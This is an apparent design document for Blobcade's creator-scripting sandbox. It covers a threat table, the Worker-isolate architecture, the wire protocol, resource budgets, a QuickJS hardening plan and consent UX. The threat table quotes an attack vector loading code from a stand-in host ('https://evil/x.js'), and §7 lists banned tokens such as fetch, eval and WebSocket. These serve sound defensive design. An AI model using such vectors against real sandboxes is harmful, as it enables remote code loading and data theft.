# Blobcade scripting (P7) — threat model + API design

The design and implementation contract for **creator scripting**: the escape
hatch from the logic-block ceiling. The first implementation lives in
`src/sdk/script-host.ts`: a Worker sandbox, message-only capability API,
watchdog, and explicit permission prompt for drafts/share links. Where this
doc and code disagree, the code wins — file a doc fix.

Read first: `docs/ROADMAP.md` (Phase 7, risk decision #2), `docs/GAMEDOC.md`
(§5 rules, §10 non-goals), `src/sdk/rules.ts` (the vocabulary scripts exceed).

## 1. Why — the logic-block ceiling

A `Rule` (`rules.ts`) is a flat `when / if / do` record: one trigger, an AND
list of `var op value` conditions, an ordered action list. By design (risk
decision #2) there is **no nesting, no expressions, no loops, no string
interpolation, no functions** — only named-counter state. That ceiling keeps
docs *inert data* (`GAMEDOC.md` §1): a malicious doc wastes CPU but never runs
code, which is the property that lets share links and community uploads open
safely.

It is also a real wall. You cannot express, in rules: a wave spawner whose
size scales with the round; matchmaking/elimination flow; per-entity AI; a
shrinking-zone timer with derived positions; anything needing arithmetic or a
collection. Squadfall-class custom modes are therefore impossible as UGC —
they stay first-party TypeScript (`GAMEDOC.md` §10).

**Scripts are the designed escape hatch, not rule-language creep.** A script
ships in the GameDoc `script` section — a single string, size-capped,
reserved since v1 (`GAMEDOC.md` §10 names it explicitly as a future field
behind the same forward-compat rules). It unlocks programmability *without*
re-opening the "no executable data" property for docs that don't use it: a
doc with no `script` field is exactly as inert as today.

## 2. Threat model

A script is **attacker-controlled code** the moment a player opens a community
link. We assume the author is hostile and the script is hand-crafted to escape.
The asset we protect: the player's browser session (DOM, origin storage,
wallet, network identity) and the device's CPU/RAM. The boundary is the
**Worker isolate** (§3); everything below is "what an attacker tries, and what
stops it".

| # | Attacker goal | Vector | Mitigation |
|---|---|---|---|
| T1 | Run on the page / **XSS** | reach `window`, `document`, the engine, other scripts | Worker has a *separate global scope* — no `window`/`document`/`parent`. Code never executes on the main thread (hard non-goal §8). The host holds all engine object references; the worker gets none. |
| T2 | **Exfiltrate** data | `fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource`, `navigator.sendBeacon`, dynamic `import()` of a URL | Delete/stub these globals at worker boot. Defense-in-depth: a `Content-Security-Policy` `connect-src 'none'` (see §3 on what is actually enforceable for blob/srcdoc workers). The worker has **no network capability in the message API** — there is no "fetch" message. |
| T3 | **Steal wallet / storage** | `localStorage`, `IndexedDB`, `caches`, `cookies` | Workers have **no `localStorage`/cookies** at all (not exposed to worker scope). `indexedDB`/`caches` are deleted at boot. The wallet (`economy.ts`) lives on the main thread and is never referenced from the worker; Blobcash move only via the `award`-class capability messages the host validates (§3), capped by the rate budget (§4). |
| T4 | **Infinite loop / CPU burn** | `while(true){}`, pathological regex, huge synchronous compute | CPU watchdog (§4): host pings, worker must pong within N ms or it is `terminate()`d and restarted with backoff; 3 strikes disables scripting for the session. A spinning plain Worker freezes *only its own thread*, never the render loop — that is the whole reason for the Worker. (Plain workers cannot be *interrupted* mid-loop; only killed — see §6 for QuickJS, which can.) |
| T5 | **Memory bomb** | grow arrays/strings until the tab OOMs | No `SharedArrayBuffer` (also gated by COOP/COEP, which we do not set). Rely on `terminate()` to reclaim the worker heap. **Honest gap:** browsers expose *no* hard per-worker memory cap to JS; we cannot bound RAM in a plain worker. Watchdog catches the *symptom* (a worker that stops ponging because it is GC-thrashing) but not the cause. QuickJS (§6) closes this with a real allocation limit. |
| T6 | **Prototype pollution toward the host** | mutate `Object.prototype` etc. to corrupt host logic | The worker's prototypes are **its own realm** — polluting them cannot reach the host realm. The wire is JSON-shaped data (structured clone), never shared objects, so a poisoned prototype does not travel. Host-side: parse messages defensively, read only own-properties, never `eval` a message field. |
| T7 | **`postMessage` abuse** | flood the host with messages; forge message shapes; transfer hostile objects | Host validates **every** message exactly like a rule action (§3): unknown `type` dropped, fields type/range-checked, refs length-capped, action messages counted against the same rate budget as `forEveryone` rules (§4). Inbound messages are plain data (no functions/DOM survive structured clone). A message flood is itself "CPU" and trips the watchdog / rate limiter. |
| T8 | **Timing side channels** | high-res timers + `SharedArrayBuffer` for Spectre-style reads | No `SAB` (T5) removes the high-resolution timing primitive; `performance.now()` in workers is coarsened by the browser. We do not expose any cross-origin readable buffer. This is a *browser-platform* mitigation we inherit, not one we invent — documented as a residual-risk reliance. |
| T9 | **Phishing / UI spoofing** | draw a fake "enter your password" overlay, mimic the Blobcade chrome | Scripts have **no DOM and no drawing primitive whatsoever** — they cannot place pixels or HTML. All player-facing output goes through the *existing* HUD vocabulary (`toast`, `big`, HUD chips), which is visibly Blobcade-framed and cannot render arbitrary markup (text is set as `textContent`, never `innerHTML` — a host-side invariant to honor). A script cannot forge native browser UI. |
| T10 | **Supply chain** | `importScripts('https://evil/x.js')`, `import('https://…')`, remote `eval` | `importScripts` is **deleted** from worker scope; dynamic `import()` of a URL is blocked by the no-network stance (T2) and CSP `default-src 'none'`. The script string is fully self-contained — there is **no module/URL import mechanism, ever** (non-goal §8). Publish-side static checks flag the *tokens* (§7) as a tripwire, not as the security boundary. |

The table is the contract. **The Worker isolate (T1) and host-side message
validation (T7) are the two load-bearing mitigations**; everything else is
defense-in-depth or an inherited platform property. Where a row says "honest
gap" (T5) or "inherited" (T8), we do not pretend to a guarantee we cannot keep.

## 3. Architecture — the Worker isolate + wire protocol

**One dedicated Web Worker per game session.** A `ScriptSystem` (a
`GameSystem`, P7-2, lifecycle `init`/`update`/`dispose` per `ARCHITECTURE.md`
§3) owns the worker, bridges it to the `EventBus` and a *whitelisted* slice of
`GameContext`, and dies with the session. The worker is created from a
**blob/`srcdoc` bootstrap** that, before running the creator string:

1. deletes the network + storage globals (`fetch`, `XMLHttpRequest`,
   `WebSocket`, `EventSource`, `importScripts`, `indexedDB`, `caches`, and any
   `navigator.sendBeacon`),
2. installs the message-only capability shim (the `blobcade` global below),
3. then evaluates the creator code in that stripped scope.

**CSP — what is actually enforceable (honest):** a dedicated worker created
from a `blob:` URL inherits the *creating document's* CSP; it does **not** get
a fresh policy from a `<meta>` tag inside blob text, and there is no per-worker
CSP header we control client-side. The reliable lever is the **page's**
response-header CSP (set by the P4-8 deploy / `server/http.mjs`) including a
`worker-src blob:` + `connect-src 'self'` policy that the worker inherits, plus
deleting the network globals in the bootstrap (which is what actually stops
`fetch`, regardless of CSP). So: **delete-the-globals is the primary control;
CSP is defense-in-depth and only as strong as the page header.** Do not claim
`default-src 'none'` "inside the worker" as a guarantee — it is inherited, not
self-imposed, and a blob worker cannot tighten its own policy. This is a
documented gap, closed properly by QuickJS (§6), which has no host globals to
delete in the first place.

**The worker NEVER receives an object reference.** It cannot hold a
`PartHandle`, the `EventBus`, `ctx.engine`, or any live instance — only JSON
data crosses the boundary (structured clone strips functions/DOM/prototypes).
Capability is expressed *only* as messages the host validates.

**The single choke point:** worker action messages are dispatched through the
**same `runAction` executor that `rules.ts` already uses**. A script therefore
gets *exactly* the powers a rule has — `toast`/`big`/`celebrate`/`win`/`kill`/
`teleport`/`award`/`movePart`/`removePart`/`openDoor`/`spawnPart`/`setVar`/
`addVar`/`sound`/`emit` (the `RULE_ACTION_TYPES` set) — just *programmable*.
No new authority is introduced by scripting; we reuse the audited vocabulary,
its sound whitelist (`RULE_SOUNDS`), and its reserved-prefix rule
(`RESERVED_EVENT_PREFIXES` — scripts may listen to `combat:`/`player:`/… but
never `emit` them). Same `PartRegistry` resolves `part` refs; unknown refs are
no-ops exactly as in rules.

### Wire protocol

All messages are `{ type, … }` plain JSON. The host treats every inbound
message as untrusted and validates type, fields, ranges, and ref lengths (≤ the
`GAMEDOC_LIMITS.ref` of 40) before acting — identical rigor to `validateGameDoc`.

**Host → worker**

| `type` | Payload | When |
|---|---|---|
| `init` | `{ doc, vars, time }` — a *snapshot* (read-only copy) of safe doc fields + declared vars + clock | once, after boot |
| `tick` | `{ time, dt }` | every frame the system updates (drives `onTick`) |
| `event` | `{ name, payload }` | an EventBus event the script `subscribe`d to (engine events, or rule/custom events) |
| `ping` | `{ seq }` | watchdog heartbeat (§4) — worker must answer `pong` |

**Worker → host**

| `type` | Payload | Effect |
|---|---|---|
| `subscribe` | `{ events: string[] }` | host begins forwarding those bus events as `event` messages (capped count; reserved-prefix listens allowed, emits not) |
| `action` | `{ action: RuleAction }` | host validates then runs it through `runAction` — the choke point. Counts against the rate budget (§4). `forEveryone` honored exactly as for rules (host/relay). |
| `getVar` / `setVar` | `{ name }` / `{ name, value }` | read/write a named counter via the rules var store (so HUD chips + `varReaches` stay live); `getVar` is answered with an `event`-shaped reply, or the worker mirrors vars from `init`+`event` and avoids round-trips |
| `log` | `{ level, msg }` | dev console only (truncated, rate-limited) — never player-facing, never DOM |
| `pong` | `{ seq }` | watchdog reply (§4) |

`getVar` exists for completeness, but the recommended pattern is **state
mirroring**: the worker keeps its own copy of vars seeded by `init` and updated
when it issues `setVar`/`addVar` actions, avoiding synchronous round-trips
(a worker cannot block on a reply without a deadlock). The host remains the
source of truth — its var store drives chips and `varReaches`.

## 4. Resource governance

Three independent budgets; tripping any one degrades gracefully.

- **CPU watchdog.** The system sends `ping{seq}` every **N = 1000 ms**; the
  worker must answer `pong{seq}` before the **next** ping (a missed pong = a
  thread stuck in compute, since message handling is starved). On a miss:
  `worker.terminate()`, then **restart with backoff** (250 ms → 1 s → 4 s).
  **3 strikes per session ⇒ scripting disabled for the rest of the session**
  (the game keeps running on its rules/parts; a HUD toast says scripting was
  stopped). This is the P7 gate: a deliberate `while(true){}` is caught and
  killed without freezing the render loop.
- **Action rate limit.** Worker `action` messages draw from the **same token
  bucket the multiplayer relay already enforces** (`server/server.mjs`:
  `eventBudget = min(20, +10/s)`, cost 1/event, `MAX_EVENT_BYTES = 2048`).
  Locally the host applies the identical bucket so single-player scripts
  cannot out-spam what the relay would accept, and `forEveryone` script
  actions share the *same* per-client budget as `forEveryone` rules — a script
  cannot get more network than the rule engine. Over-budget actions are
  dropped (with a `log`), not queued unboundedly.
- **Memory.** No `SharedArrayBuffer` (we set no COOP/COEP). Reclamation is via
  `terminate()` only. **Honest gap (restated from T5):** browsers give JS no
  hard per-worker heap cap; a plain worker can balloon RAM until the watchdog
  kills it for not ponging. We document this rather than imply a cap that does
  not exist. QuickJS (§6) adds a real byte limit.

## 5. The API creators see

A script is a self-contained string. It sees one global, `blobcade`, mirroring
the rule-action vocabulary plus `onTick`/`on` hooks and the var store. No
imports, no DOM, no globals beyond this. Sketch of a wave spawner that scales
with the round — *expressible here, impossible in rules*:

```js
// A wave spawner: each wave is bigger and faster than the last.
let wave = 0
let nextAt = 0

blobcade.on('start', () => {
  blobcade.toast('Survive the waves!')
})

blobcade.onTick((t /* seconds */) => {
  if (t < nextAt) return
  wave += 1
  const count = 3 + wave * 2            // arithmetic — no rule can do this
  const radius = 12 + wave              // derived geometry
  for (let i = 0; i < count; i++) {     // a loop — no rule can do this
    const a = (i / count) * Math.PI * 2
    blobcade.spawnPart({
      kind: 'part', tag: 'creep',
      at: [Math.cos(a) * radius, 1, Math.sin(a) * radius],
      size: [1, 1, 1], color: '#e74c3c',
    })
  }
  blobcade.setVar('wave', wave)          // drives the HUD chip + varReaches
  blobcade.big('Wave ' + wave)
  nextAt = t + Math.max(2, 8 - wave)    // ramps the cadence
})
```

Every `blobcade.*` call is a validated `action`/`subscribe`/`setVar` message —
the script never touches an engine object. `spawnPart`/`setVar`/`big`/`toast`
are the *same* actions a rule would emit; the script just decides *when* and
*how many* with real control flow.

## 6. QuickJS-in-WASM — the hardening step

A plain Worker is the v1 isolate. **QuickJS compiled to WASM** (a tiny JS
engine running *inside* the worker, executing the creator string in its own
interpreter) is the next hardening tier behind the **same wire protocol** —
swapping the executor, not the API.

What QuickJS adds over a plain worker:

- **Deterministic interrupts.** A host interrupt callback can halt execution
  mid-instruction (an *interruptible* loop), so `while(true){}` is stopped
  precisely instead of only `terminate()`d after a missed pong. Closes the
  "can't interrupt a plain worker" caveat in T4.
- **Real memory limit.** QuickJS exposes a byte cap + GC threshold per
  context — the hard per-script RAM bound browsers deny us (closes the T5/§4
  gap honestly).
- **No host globals at all.** The interpreter starts with *nothing* — there is
  no `fetch`/`importScripts`/`window` to delete and no risk of forgetting one
  in the bootstrap. We add back exactly the `blobcade` shim. Removes the
  "delete-the-globals could miss one" and "CSP is only inherited" weaknesses.
- **Determinism.** Useful later for replicated/deterministic match logic.

What it costs: **~500 KB of WASM** in the bundle, an interpreter perf tax
(roughly an order of magnitude slower than native JS — fine for game logic,
not for hot numeric loops), and a build/integration step.

**Recommendation:** ship **plain Worker for v1** (P7-2) — it clears the gate
(kill an infinite loop without freezing the page) at zero bundle cost and is
sufficient for casual UGC, with the gaps documented above. Adopt **QuickJS
behind the identical protocol** when the platform grows (untrusted scripts at
scale, replicated logic, or the memory/interrupt gaps start biting). Because
the wire protocol and `blobcade` API are unchanged, this is an executor swap —
no creator script and no host capability code changes.

## 7. Trust UX

Scripting changes a doc from "inert data anyone can open" to "code that runs",
so the player must *consent and be informed*:

- **Per-game permission prompt** before the **first** run of a scripted game
  on this device: "This game runs creator code in a sandbox (no network, no
  storage access). Run it?" Decision is remembered per `meta.id`. Built-in
  games never prompt (they are first-party).
- **"Scripted" badge** on discovery cards and the pre-play screen —
  player-visible, the way a `🛡` would mark unverified content. The trust
  signal travels with the game (P7-3 flags scripted games in the publish flow).
- **Publish-side static checks** (server, P7-3): enforce the `script` size cap
  (a `GAMEDOC_LIMITS` entry, e.g. 64 KB matching `textmap`), and flag/refuse
  obvious banned tokens (`importScripts`, `eval`, `Function(`, `fetch`,
  `WebSocket`, `://`). **These are tripwires, not security** — they reject
  lazy abuse and keep the corpus clean, but a determined attacker minifies
  around them; the *only* real boundary is the runtime isolate (§3). Say so in
  the code comment so no one mistakes the linter for the sandbox.

## 8. Non-goals (hard lines)

- **No `eval` / no main-thread execution, ever.** Creator code runs only inside
  the Worker isolate. Nothing from a doc is `eval`'d or `new Function`'d on the
  page. (Reaffirms `ROADMAP.md` non-goals and `GAMEDOC.md` §10.)
- **No DOM API.** Scripts cannot read or write HTML/CSS/canvas. Player-facing
  output is the existing HUD vocabulary only (anti-phishing, T9).
- **No network API.** No `fetch`/`WebSocket`/`sendBeacon`/`import(url)` and no
  message that performs I/O. Multiplayer reach is only via `forEveryone`
  actions through the existing rate-limited relay.
- **No cross-game / persistent storage.** No `localStorage`/`IndexedDB`/cookies.
  A script's only durable state is the doc's named `vars` for that session;
  nothing leaks between games or persists across sessions.
- **No new authority over rules.** Scripts get the `RULE_ACTION_TYPES` set and
  nothing more. New powers require extending the *rule* vocabulary first (and
  its validation), so rules and scripts never diverge in what they can do.
- **No module/URL imports.** The script string is wholly self-contained; there
  is no import mechanism to add a supply-chain surface (T10).
